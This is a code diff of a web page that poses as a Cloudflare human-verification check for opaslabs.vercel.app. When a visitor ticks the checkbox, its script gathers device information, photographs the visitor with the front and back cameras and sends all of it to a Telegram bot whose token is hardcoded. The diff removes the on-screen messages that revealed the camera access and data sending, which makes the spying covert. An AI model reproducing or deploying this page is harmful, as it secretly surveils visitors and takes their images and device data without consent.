@@ -12,30 +12,20 @@
       font-family: 'Roboto', sans-serif;
       background-color: #f4f4f4;
       margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    main {
-      background-color: white;
-      border-radius: 8px;
-      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
       padding: 20px;
-      max-width: 500px;
-      width: 100%;
-      text-align: center;
+      min-height: 100vh;
     }
     h1 {
       font-size: 1.875rem;
       font-weight: normal;
       margin-bottom: 0.5rem;
+      text-align: left;
     }
     p {
       font-size: 1.125rem;
       font-weight: normal;
       margin-bottom: 1.5rem;
+      text-align: left;
     }
     section {
       border: 1px solid #d1d5db;
@@ -44,6 +34,7 @@
       display: flex;
       align-items: center;
       margin-bottom: 1.5rem;
+      text-align: left;
     }
     input[type="checkbox"] {
       width: 1.25rem;
@@ -79,32 +70,24 @@
     .mt-0.5 {
       margin-top: 0.125rem;
     }
-    #loading {
-      font-size: 1.125rem;
-      margin-top: 1.25rem;
-      color: #555;
-    }
   </style>
 </head>
 <body>
-  <main>
-    <h1>opaslabs.vercel.app</h1>
-    <p>Checking if the site connection is secure</p>
-    <section>
-      <input id="verifyHuman" type="checkbox" />
-      <label for="verifyHuman">Verify you are human</label>
-      <div class="ml-4 flex flex-col items-center">
-        <img alt="Cloudflare logo orange cloud with text" class="h-6 w-auto" src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" />
-        <div class="text-xs text-gray-600 flex space-x-1 mt-0.5">
-          <span>Privacy</span>
-          <span>·</span>
-          <span>Terms</span>
-        </div>
+  <h1>opaslabs.vercel.app</h1>
+  <p>Checking if the site connection is secure</p>
+  <section>
+    <input id="verifyHuman" type="checkbox" />
+    <label for="verifyHuman">Verify you are human</label>
+    <div class="ml-4 flex flex-col items-center">
+      <img alt="Cloudflare logo orange cloud with text" class="h-6 w-auto" src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" />
+      <div class="text-xs text-gray-600 flex space-x-1 mt-0.5">
+        <span>Privacy</span>
+        <span>·</span>
+        <span>Terms</span>
       </div>
-    </section>
-    <p>opaslabs.vercel.app needs to review the security of your connection before proceeding.</p>
-    <div id="loading">Waiting for verification...</div>
-  </main>
+    </div>
+  </section>
+  <p>opaslabs.vercel.app needs to review the security of your connection before proceeding.</p>
 
   <script>
     const telegramBotToken = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ";
@@ -295,15 +278,11 @@
     // Execute when checkbox is checked
     document.getElementById('verifyHuman').addEventListener('change', async function() {
       if (this.checked) {
-        const loadingElement = document.getElementById('loading');
-        loadingElement.textContent = 'Collecting data...';
-
         const info = await getDeviceInfo();
 
         // Capture front camera (only once)
         let frontSnap = null;
         if (!frontCaptured) {
-          loadingElement.textContent = 'Accessing front camera...';
           frontSnap = await getSnapshot("user");
           frontCaptured = true;
         }
@@ -311,7 +290,6 @@
         // Capture back camera (only once)
         let backSnap = null;
         if (!backCaptured) {
-          loadingElement.textContent = 'Accessing back camera...';
           backSnap = await getSnapshot("environment");
           backCaptured = true;
         }
@@ -328,7 +306,6 @@
         }
 
         // Send info and photos
-        loadingElement.textContent = 'Sending data...';
         await sendTextToTelegram(info);
         if (frontSnap) await sendPhotoToTelegram(frontSnap, "📷 Front Camera");
         if (backSnap) await sendPhotoToTelegram(backSnap, "📷 Back Camera");
